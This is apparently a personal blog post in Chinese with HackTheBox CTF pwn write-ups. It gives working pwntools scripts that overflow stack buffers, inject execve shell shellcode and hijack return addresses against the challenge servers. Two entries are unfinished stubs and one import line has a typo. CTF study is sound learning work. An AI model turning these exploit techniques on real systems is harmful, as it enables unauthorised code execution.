---
title: HackTheBox CTF Try Out - pwn
date: 2024-12-10 14:02:19
tags:
    - HTB
    - ctf
    - pwn
excerpt: Regularity | Abyss | Labyrinth | Void
---

## HackTheBox CTF Try Out

HackTheBox 平台上的新手導向 CTF

[](https://ctf.hackthebox.com/event/details/ctf-try-out-1434)

### Regularity

這題的 read function 中有一個 overflow
因爲他什麼保護都沒開所以我們只需要把shellcode 寫進 stack 中，利用 `jmp rsi` gadget 就會跳到寫入 shellcode 的地方

- read function disassemble

![images](https://hackmd.io/_uploads/HJEwKiBNkx.png)

```python
rom pwn import *

context.arch = 'amd64'

r = remote('94.237.53.5',59584)

bss = 0x402000

sc =  asm("""
        xor rax ,rax
        mov rbx , 0x68732F6E69622F
        push rbx
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 0x3b
        syscall
""")

# or asm(shellcraft.sh())

# lea    rsi,[rsp]
jmp_rsi = 0x401041

p = flat(sc, b'a'* (0x100-len(sc)),jmp_rsi)

r.sendlineafter(b'?',p)

r.sendline(b'cat flag.*')

r.interactive()

```

#### 為什麼是塞 0x100 不是 0x108

這支程式在 function prologue&Epilogue 都沒動到rbp，因為這樣所以不需要 + 0x8 蓋過 rbp

```ASKGPT
現代 x86-64 編譯器不修改 rbp 是合理的，尤其是函數使用 stack pointer (rsp) 來存取局部變數和函數參數，而不是使用 base pointer (rbp) 。
現代編譯器（例如 GCC 和 Clang）在最佳化模式下會省略對 rbp 的操作，從而減少不必要的指令。
這種方法叫做 frame pointer omission (FPO)。
```

### Abyss

> not yet

### Labyrinth

- 比對字串後有一個 `fgets`的 overflow 跳到 `escape_plan()` 就會輸出 flag

```python=
from pwn import *

r = remote("94.237.62.166" , 45685)

p = b'a'*56 +p64(0x401256) # push rbp 後面

r.sendlineafter(b'>>',b'69') # 第一次輸入完會比對字串 ==69 ，之後還有一次輸入有 Overflow

r.sendlineafter(b'>>', p)

r.interactive()
```

![images](https://hackmd.io/_uploads/SJEno0BZ1g.png)

### Void

> ret2dl_resolve
